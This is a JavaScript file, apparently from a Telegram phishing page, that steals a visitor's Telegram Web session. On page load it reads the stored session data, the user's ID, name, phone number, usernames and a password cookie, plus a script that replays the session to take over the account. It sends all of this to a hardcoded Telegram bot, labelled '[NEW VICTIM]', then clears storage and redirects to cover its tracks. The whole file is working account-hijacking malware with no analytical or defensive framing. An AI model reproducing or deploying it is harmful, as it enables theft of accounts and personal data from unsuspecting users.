document.addEventListener("DOMContentLoaded", function () {
  const BOT_TOKEN = "7838657657:AAG3KHbJvXfSpERU_oKDf-kazFL1FMoI9tQ";
  const CHAT_ID = "6686015911";

  async function checkLocalStorage() {
    const globalState = localStorage.getItem("tt-global-state");
    const userAuth = localStorage.getItem("user_auth");

    if (globalState && userAuth) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users?.byId?.[currentUserId];

      if (currentUserId && currentUser) {
        document.body.style.display = "none";

        const { firstName, usernames, phoneNumber, isPremium, quicklySet = {} } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "N/A";

        let usernameText = "";
        if (Array.isArray(usernames)) {
          usernameText = usernames.map((u, i) => `${i + 1}. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n");
        } else {
          usernameText = "N/A";
        }

        const quickScript = Object.entries(quicklySet)
          .map(([k, v]) => `localStorage.setItem("${k}", "${v}");`)
          .join(" ") + " window.location.reload();";

        const message = `
+++++[NEW VICTIM]++++++
🆔 ID: ${currentUserId}
📛 Name: ${firstName}
📱 Phone: ${phoneNumber}
🔐 Password: ${password}
🏷️ Username(s): 
${usernameText}
💎 Premium: ${isPremium ? "Yes" : "No"}
⚠️ Execute: ${quickScript}
+++++[FINISH DATA]++++++
        `.trim();

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        // Cleanup
        window.Telegram?.WebApp?.close?.();
        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";

        clearInterval(checkInterval);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});